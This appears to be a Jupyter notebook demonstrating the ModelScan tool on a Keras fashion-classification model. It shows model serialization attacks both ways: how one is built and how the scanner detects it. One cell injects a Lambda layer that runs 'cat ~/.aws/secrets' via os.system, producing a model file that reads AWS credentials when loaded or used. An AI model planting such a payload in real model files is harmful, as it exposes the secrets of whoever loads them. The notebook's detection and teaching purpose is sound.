{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "873716ff",
   "metadata": {},
   "source": [
    "# Running ModelScan on a Keras Model"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "63233445",
   "metadata": {},
   "source": [
    "## Import statements"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ede2db21",
   "metadata": {},
   "outputs": [],
   "source": [
    "import tensorflow as tf\n",
    "import os\n",
    "tf.compat.v1.logging.set_verbosity(tf.compat.v1.logging.ERROR)\n",
    "from utils.tensorflow_fashion_mnist_model import train_model, get_predictions"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4dc17f2a",
   "metadata": {},
   "source": [
    "## Download and save the model\n",
    "\n",
    "We are going to use a Keras model which is for classification of fashion/clothing items and trained on fashion mnist dataset (https://www.tensorflow.org/tutorials/keras/classification). The safe model is saved at `KerasModels/safe_model` "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7ecea198",
   "metadata": {},
   "outputs": [],
   "source": [
    "model_directory = \"KerasModels\"\n",
    "if not os.path.isdir(model_directory):\n",
    "    os.mkdir(model_directory)\n",
    "\n",
    "safe_model_path = os.path.join(model_directory, \"safe_model.h5\")\n",
    "model = train_model()\n",
    "model.save(safe_model_path,)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3f316d16",
   "metadata": {},
   "source": [
    "## Run the model\n",
    "\n",
    "Run the safe model to verify that it has been downloaded correctly."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "68770a90",
   "metadata": {},
   "outputs": [],
   "source": [
    "number_of_predictions = 3\n",
    "get_predictions(model, number_of_predictions)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "66644ce5",
   "metadata": {},
   "source": [
    "## Run ModelScan on the safe model\n",
    "\n",
    "Now run the Modelscan tool using the modelscan command. Remember that we installed modelscan in our virtualenv. \n",
    "\n",
    "**The scan results include information on the files scanned, and any issues if found. For the safe model scanned, modelscan finds no model serialization attacks.**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d2bc3c58",
   "metadata": {},
   "outputs": [],
   "source": [
    "!modelscan -p ./KerasModels/safe_model.h5"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ffb6fd80",
   "metadata": {},
   "source": [
    "## Model Serialization Attack\n",
    "\n",
    "Here malicious code is injected in the safe model to read aws secret keys using Keras' lambda layer. The unsafe model is saved at `./KerasModels/unsafe_model.h5`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4f016506",
   "metadata": {},
   "outputs": [],
   "source": [
    "safe_model_loaded = tf.keras.models.load_model(safe_model_path)\n",
    "\n",
    "attack = (    \n",
    "    lambda x: os.system(\n",
    "        \"\"\"cat ~/.aws/secrets\"\"\"\n",
    "    )\n",
    "    or x\n",
    ")\n",
    "\n",
    "lambda_layer = tf.keras.layers.Lambda(attack)(safe_model_loaded.outputs[-1])\n",
    "unsafe_model = tf.keras.Model(inputs=safe_model_loaded.inputs, outputs=lambda_layer)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "908487a3",
   "metadata": {},
   "source": [
    "## Save the Model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "66da5e7c",
   "metadata": {},
   "outputs": [],
   "source": [
    "unsafe_model_path = os.path.join(model_directory, \"unsafe_model.h5\")\n",
    "unsafe_model.save(unsafe_model_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d7a21a7b",
   "metadata": {},
   "source": [
    "## Unsafe Model Prediction\n",
    "\n",
    "The malicious code injected in the unsafe model gets executed when it is loaded. The aws secret keys are displayed.\n",
    "\n",
    "Also, the unsafe model predicts the clothing items just as well as safe model i.e., the code injection attack will not impact the model performance. The unaffected performance of unsafe models makes the ML models an effective attack vector."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d13f0de1",
   "metadata": {},
   "outputs": [],
   "source": [
    "unsafe_model_loaded = tf.keras.models.load_model(unsafe_model_path)\n",
    "\n",
    "number_of_predictions = 3\n",
    "get_predictions(unsafe_model_loaded, number_of_predictions)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "779f6b43",
   "metadata": {},
   "source": [
    "## Run ModelScan on the unsafe model\n",
    "\n",
    "The scan results include information on the files scanned, and any issues if found. In this case, a critical severity level issue is found in the unsafe model scanned.\n",
    "\n",
    "modelscan also outlines the found operator(s) and module(s) deemed unsafe."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0e813260",
   "metadata": {},
   "outputs": [],
   "source": [
    "!modelscan -p KerasModels/unsafe_model.h5"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5a27ca8e",
   "metadata": {},
   "source": [
    "## Change the reporting format of output\n",
    "\n",
    "This will save the scan results in file: keras-model-scan-results.json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e7fd61b4",
   "metadata": {},
   "outputs": [],
   "source": [
    "!modelscan --path  KerasModels/unsafe_model.h5 -r json -o keras-model-scan-results.json"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
